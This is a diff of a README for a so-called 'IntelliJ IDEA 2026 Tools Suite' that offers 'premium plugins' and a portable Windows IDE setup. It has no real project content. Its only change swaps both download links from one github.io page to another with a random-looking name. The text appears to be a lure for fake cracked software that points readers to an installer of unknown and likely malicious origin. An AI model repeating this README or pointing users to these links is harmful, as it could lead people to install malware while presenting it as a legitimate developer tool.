@@ -2,7 +2,7 @@
 
 This repository provides a powerful and flexible set of tools designed to enhance and customize your JetBrains IntelliJ IDEA environment on Windows 10/11. Whether you are looking to explore premium plugins, manage your workspace efficiently, or set up a portable environment, the IntelliJ IDEA 2026 Tools Suite offers a streamlined solution for developers seeking a full-featured, optimized IDE experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -41,6 +41,6 @@ Installation to `Program Files` requires admin rights. However, you can select a
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: October 2026*
